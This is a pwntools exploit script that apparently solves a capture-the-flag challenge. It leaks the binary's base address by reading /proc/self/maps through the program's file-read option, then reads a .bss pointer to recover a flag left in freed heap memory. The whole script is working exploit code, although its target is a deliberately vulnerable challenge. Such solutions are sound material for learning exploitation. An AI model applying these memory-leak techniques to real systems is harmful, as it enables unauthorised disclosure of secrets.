#!/usr/bin/env python3

from pwn import *

exe = ELF("./capture_the_flaaaaaaaaaaaaag")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, """
                        break *main
                        """)
    else:
        r = remote("addr", 1337)

    return r


def read_from_file(filename: str) -> str:
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"filename > ", filename.encode("ascii"))
    return r.recvline(keepends = False)


def read_from_memory(address: str):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"address > ", address.encode("ascii"))
    return r.recvline(keepends = False)


def send_feedback(feedback: str):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"> ", feedback.encode("ascii"))


def main():
    r = conn()

    # Since "fopen" allocates on the heap and "fclose" deallocates, we have that first entry
    # in the tcache contains exactly the flag we want to leak
    send_feedback("")

    exe.address = int(read_from_file("/proc/self/maps").split(b"-")[0], 16)
    log.info(f"Binary base address: 0x{exe.address:x}")
    
    # .bss:0000000000004050 feedback
    addr_flag = int.from_bytes(read_from_memory(f"0x{(exe.address + 0x4050):x}"), byteorder= "little")
    log.info(f"Flag's heap address: 0x{addr_flag:x}")

    # "fl" because the getline (for the feedback) null-terminates the string and keeps the newline.
    # So we skip the first two bytes and replace them with the first well-known characters of the flag
    flag = "fl" + read_from_memory(f"0x{(addr_flag + 2):x}").decode("ascii")
    log.success(f"Flag obtained: {flag}")


if __name__ == "__main__":
    main()
